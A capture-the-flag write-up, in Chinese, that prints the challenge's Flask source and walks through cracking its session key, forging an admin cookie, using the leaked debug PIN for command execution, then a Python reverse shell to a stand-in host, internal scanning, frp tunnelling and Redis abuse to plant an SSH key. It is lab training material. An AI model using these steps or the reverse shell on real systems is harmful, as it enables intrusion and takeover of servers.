            session['user'] = username
            session['power'] = dataSql.getPower(username)
            return redirect('/index')
        else:
            flash("username or password incorrect")
            return redirect('login')
    else:
        return '''<script>alert("You have already logged in.");window.location.href="/index";</script>'''

# change the password


@app.route('/change', methods=['GET', 'POST'])
def foundpwd():
    if request.method == 'GET':
        return render_template('changepwd.html')
    username = request.form['user']
    oldPassword = request.form['oldPassword']
    newPassword = request.form['newPassword']
    a = dataSql.changePassword(username, oldPassword, newPassword)
    if a == True:
        return '''
    change successfully
    <br>
    <a href='login'>login now</a>
    '''
    else:
        flash(a)
        return redirect('change')


# register for enter the message board
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    id = dataSql.usersName()
    username = request.form['user']
    password = request.form['password']
    power = 'guest'
    if dataSql.register(id, username, password, power):
        return '''
    register successfully
    <br>
    <a href='login'>login now</a>
    '''
    else:
        flash('username already exists')
        return redirect('register')


@app.route('/logout', methods=['GET'])
def logout():
    if 'user' in session:
        session.pop('user')
        return redirect('/login')
    else:
        return '''
    you are not logged in
    <br>
    <a href='login'>login now</a>
    '''


@app.route('/', methods=['GET', 'POST'])
@app.route('/index', methods=['GET', 'POST'])
def index():
    if 'user' in session:
        if request.method == 'GET':
            msg = getMsgList()
            if session['power'] == 'guest':
                for i in msg:
                    # remove the message send by other user on private condition
                    if i[3] == "1" and session['user'] != i[0]:
                        msg.remove(i)
            return render_template('index.html', username=session['user'], msg=msg)
        else:
            message = request.form['message']
            username = session['user']
            nowtime = str(datetime.datetime.now())
            if 'private' in request.form:
                private = 1
            else:
                private = 0
            if message == '':
                return '''<script>alert("invalid input");window.location.href="/index";</script>'''
            dataSql.uploadMessage(username, message, nowtime, private)
            return '''<script>alert("upload successfully");window.location.href="/index";</script>'''
    else:
        return redirect('/login')


@app.route('/delete', methods=['GET'])
def delete():
    if 'user' in session:
        psg = request.args.get('psg')
        msg = list(dataSql.showMessage())
        for i in range(len(msg)):
            h1 = md5()
            h1.update(str(msg[i][2]).encode(encoding='utf-8'))
            h2 = h1.hexdigest()
            if (msg[i][0] == session['user'] or session['power'] == 'root') and h2 == psg:
                dataSql.deleteMessage(msg[i][0], msg[i][2])
                return redirect('/index')
        return '''<script>alert("Permission denied");window.location.href="/index";</script>'''
    else:
        return '''<script>alert("login first");window.location.href="/index";</script>'''


@app.route('/index/api/getMessage', methods=['GET'])
def getMessage():
    username = request.args.get('username')
    password = request.args.get('password')
    if(username == None or password == None):
        return {'status': 'failed', 'message': 'invalid input'}
    elif(not dataSql.canLogin(username, password)):
        return {'status': 'failed', 'message': 'username or password incorrect'}
    elif(dataSql.canLogin(username, password)):
        msg = getMsgList()
        if dataSql.getPower(username) == 'guest':
            for i in msg:
                # remove the message send by other user on private condition
                if i[3] == "1" and username != i[0]:
                    msg.remove(i)
        return msg


def getMsgList():
    msg = list(dataSql.showMessage())
    for i in range(len(msg)):
        h1 = md5()
        h1.update(str(msg[i][2]).encode(encoding='utf-8'))
        msg[i] += tuple([h1.hexdigest()])
    return msg


if __name__ == '__main__':
    app.run(host = "0.0.0.0", debug=True, port=8000)

```

**datasql.py**

```python
import pymysql
import time
import getPIN

pin = getPIN.get_pin()

class Database:
    def __init__(self, max_retries=3):
        self.max_retries = max_retries
        self.db = None

    def __enter__(self):
        self.db = self.connect_to_database()
        return self.db, self.db.cursor()

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.db and self.db.open:
            self.db.close()

    def connect_to_database(self):
        retries = 0
        while retries < self.max_retries:
            try:
                db = pymysql.connect(
                    host="mysql",  # 数据库地址
                    port=3306,  # 数据库端口
                    user="root",  # 数据库用户名
                    passwd="The_P0sswOrD_Y0u_Nev3r_Kn0w",  # 数据库密码
                    database="messageboard",  # 数据库名
                    charset='utf8'
                )
                return db
            except pymysql.Error as e:
                retries += 1
                print(f"Connection attempt {retries} failed. Retrying in 5 seconds...")
                time.sleep(5)
        raise Exception("Failed to connect to the database after maximum retries.")

def canLogin(username,password):
    with Database() as (db, cursor):
        sql = 'select password from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if res[0][0] == password:
                return True
        return False

def register(id,username,password,power):
    with Database() as (db, cursor):
        sql = 'select username from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            return False
        else:
            sql = 'insert into users (id,username,password,power) values (%s,%s,%s,%s)'
            cursor.execute(sql, (id,username,password,power))
            db.commit()
            return True

def changePassword(username,oldPassword,newPassword):
    with Database() as (db, cursor):
        sql = 'select password from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if oldPassword == res[0][0]:
                sql = 'update users set password=%s where username=%s'
                cursor.execute(sql, (newPassword,username))
                db.commit()
                return True
            else:
                return "wrong password"
        else:
            return "username doesn't exist."

def uploadMessage(username,message,nowtime,private):
    with Database() as (db, cursor):
        sql = 'insert into message (username,data,time,private) values (%s,%s,%s,%s)'
        cursor.execute(sql, (username,message,nowtime,private))
        db.commit()
        return True

def showMessage():
    with Database() as (db, cursor):
        sql = 'select * from message'
        cursor.execute(sql)
        res = cursor.fetchall()
        res = [tuple([str(elem).replace('128-243-397', pin) for elem in i]) for i in res]
        return res

def usersName():
    with Database() as (db, cursor):
        sql = 'select * from users'
        cursor.execute(sql)
        res = cursor.fetchall()
        return len(res)

def getPower(username):
    with Database() as (db, cursor):
        sql = 'select power from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        return res[0][0]

def deleteMessage(username,pubTime):
    with Database() as (db, cursor):
        sql = 'delete from message where username=%s and time=%s'
        cursor.execute(sql,(username,pubTime))
        db.commit()
        return True
```

**getPIN.py**

```python
import hashlib
from itertools import chain
import uuid
def get_pin():
    probably_public_bits = [
        'root'# username  /proc/self/environ
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
    uuid1 = str(uuid.getnode())
    linux = b""

        # machine-id is stable across boots, boot_id is not.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except OSError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except OSError:
        pass
    linux = linux.decode('utf-8')
    private_bits = [
        uuid1,
        linux,
    ]
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv=None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv
```

初步分析代码来看需要伪造session会话然后登录管理员账号

```python
app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
#关键代码为这一行前面值固定后面不唯一系统随机生成使用python脚本进行暴力枚举

```

这个题目和某一个题目非常的相似

[[CTF\]2022美团CTF WEB WP_os.urandom(2).hex()_Sapphire037的博客-CSDN博客](https://blog.csdn.net/Sapphire037/article/details/126919498)

```python
import os
with open('dict.txt','w') as f:
	for i in range(1,50000):
		a="This-random-secretKey-you-can't-get"+os.urandom(2).hex()
		f.write(a)
		f.write('\n')

```

[Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)](https://github.com/Paradoxis/Flask-Unsign)

[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)-unsign工具可以通过字典爆破key

先注册一个用户来获取当前的session

```
flask-unsign.exe --unsign --cookie "eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFiY2QifQ.ZQ6D4A.1l_objuFHXoApsS1mvzzMsl9k2w" --wordlist .\dict.txt
```

![image-20230923142853852](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png)

使用flask-session-cookie-manager 工具对获取的key进行加密管理员session

![image-20230923143402274](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png)

替换原本session进行登录可见pin泄露

![image-20230923143843592](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png)

有了该pin码可访问给出的console接口从而执行任意命令

http://47.115.201.35:8000/console

![image-20230923144108060](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png)

到现在外网基本拿下了接下来需要内网渗透根据题目提示需要读取根目录的提示文件

![image-20230923144614869](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png)

由于该页面操作不是特别友好反弹一个shell在vps上以便后续操作

反弹shell生成网站：[反弹shell命令在线生成器|🔰雨苁🔰 (ddosi.org)](https://www.ddosi.org/shell/)

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-ip",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![image-20230923145032369](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png)

根据前面的提示需要对内网进行扫描，使用fscan工具对其它主机进行一个初步的判断

![image-20230923145238948](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png)

![image-20230923145730806](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png)

```bash
172.20.0.1:888 open
172.20.0.2:22 open
172.20.0.1:22 open
172.20.0.1:21 open
172.20.0.2:6379 open
172.20.0.4:8080 open
172.20.0.1:80 open
172.20.0.3:3306 open
172.20.0.1:3306 open
172.20.0.1:7777 open
```

排除网关地址存在mysql和redis根据题目要求可解出第二个压缩包密码

**22-3306-6379-8080**

```
当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
连接代理，推荐`proxychains`
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3

```

到这里就需要搭建代理进行内网渗透了推荐使用frp进行内网穿透VPS搭建好服务端

基本配置如下

```bash
[common]
bind_port = 7000
```

接下来是客户端配置

```bash
[common]
server_addr=vps-addr
server_port=7000
[socks5_proxy]
remote_port = 6005
plugin = socks5
[mysql]
type = tcp
local_ip = 172.20.0.3
local_port = 3306
remote_port = 6001
```

由于反弹shell不太好写入只能一行一行的进行写入

[linux之echo写入单行文件，cat写入多行文件_echo写入多行_闭关苦炼内功的博客-CSDN博客](https://blog.csdn.net/frdevolcqzyxynjds/article/details/106785218)

链接VPS IP即可密码在网站根目录有给出

```
passwd="The_P0sswOrD_Y0u_Nev3r_Kn0w"
```

![image-20230923160506306](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png)

![image-20230923160820637](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png)

接下来需要利用内网的redis进行下一步操作修改frp配置文件连接redis

[redis未授权访问漏洞三种提权方式_redis提权_遇事不决，可问春风、的博客-CSDN博客](https://blog.csdn.net/FryhRx/article/details/124087653)



```
[redis]
type = tcp
local_ip = 172.20.0.2
local_port = 6379
remote_port = 6002
[ssh]
type = tcp
local_ip = 172.20.0.2
local_port = 22
remote_port = 6003
```

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
cat /root/.ssh/key.txt | redis-cli -h vps-ip -p 6002 -x set xxx
```

![image-20230923162650038](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png)

写入ssh公钥使用vps私钥连接即可同时也需要挂上代理

**ssh -i id_rsa  root@vps-ip  -p 6003**



![image-20230923163217649](https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png)

